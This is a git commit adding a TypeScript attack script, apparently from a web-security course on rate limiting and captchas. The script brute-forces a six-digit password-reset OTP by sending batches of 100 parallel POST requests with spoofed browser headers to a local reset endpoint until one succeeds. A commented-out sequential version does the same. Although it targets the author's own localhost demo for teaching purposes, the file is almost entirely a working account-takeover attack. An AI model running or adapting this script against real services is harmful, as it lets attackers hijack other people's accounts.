71dc11ae509dbad368fcf85b89c3b4c78df81f9b
chiragyadav2003 <97416399+chiragyadav2003@users.noreply.github.com>
2024-06-19 17:35:42 +0530

    attack - send batch request for otp hit and reset password

---
+++ week-21/DDos_RateLimit_Captcha/attack/attack.ts
@@ -0,0 +1,113 @@
+import axios from "axios";
+
+async function sendRequest(otp: number) {
+  let data = JSON.stringify({
+    "email": "chirag@gmail.com",
+    "otp": otp.toString(),
+    "newPassword": "newSecretPassword"
+  });
+
+  let config = {
+    method: 'post',
+    maxBodyLength: Infinity,
+    url: 'http://localhost:3000/reset-password',
+    headers: {
+      'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
+      'Next-Router-State-Tree': '%5B%22%22%2C%7B%22children%22%3A%5B%22admin%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
+      'sec-ch-ua-mobile': '?0',
+      'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+      'Accept': 'text/x-component',
+      'Referer': 'http://localhost:3000/admin',
+      'Next-Action': 'a221b071140e55563e91a3226c508cb229c121f6',
+      'sec-ch-ua-platform': '"macOS"',
+      'Content-Type': 'application/json'
+    },
+    data: data
+  };
+
+  try {
+    await axios.request(config)
+    console.log("password has been reset for " + otp);
+  } catch (e) {
+
+  }
+}
+
+async function main() {
+  for (let i = 100000; i < 1000000; i += 100) {
+    const promises = [];
+    console.log("here for " + i);
+    for (let j = 0; j < 100; j++) {
+      promises.push(sendRequest(i + j))
+    }
+    await Promise.all(promises);
+  }
+}
+
+main()
+// ---------------------------------------------------------------------------
+
+// import * as readline from 'readline';
+// import axios from 'axios';
+
+// function prompt(message: string): Promise<string> {
+//   return new Promise((resolve, reject) => {
+//     const rl = readline.createInterface({
+//       input: process.stdin,
+//       output: process.stdout
+//     });
+
+//     rl.question(message, (answer) => {
+//       rl.close();
+//       resolve(answer);
+//     });
+//   });
+// }
+
+// const email = prompt("Enter email for which you want to reset password and generate OTP:")
+//   .then(async (email) => {
+//     console.log(`Email : ${email}`);
+//     await generateOtp(email);
+//     console.log("OTP has been generated and logged");
+//     console.log("Resetting password with OTP.................");
+//     await resetPasssword(email, "newPassword")
+//   })
+//   .catch((err) => {
+//     console.error(err);
+//   });
+
+
+// //function to generate opt with the help of axios request
+// async function generateOtp(email: string) {
+//   const res = await axios.post("http://localhost:3000/generate-otp", { email })
+//   const data = res.data;
+//   console.log(data);
+// }
+
+//function to reset password with the help of axios request and in a loop which will run until the otp is correct
+// async function resetPasssword(email: string, newPassword: string) {
+//   for (let i = 100000; i <= 999999; i++) {
+//     let bodyContent = JSON.stringify({
+//       "email": "chirag@gmail.com",
+//       "otp": i.toString(),
+//       "newPassword": "secretpassword"
+//     });
+//     let headersList = {
+//       "Accept": "*/*",
+//       "User-Agent": "Thunder Client (https://www.thunderclient.com)",
+//       "Content-Type": "application/json"
+//     }
+//     let reqOptions = {
+//       url: "http://localhost:3000/reset-password",
+//       method: "POST",
+//       headers: headersList,
+//       data: bodyContent,
+//     }
+//     const res = await axios.request(reqOptions);
+//     const data = res.data;
+//     console.log(data);
+//     if (data.success === true) {
+//       break;
+//     }
+//   }
+// }
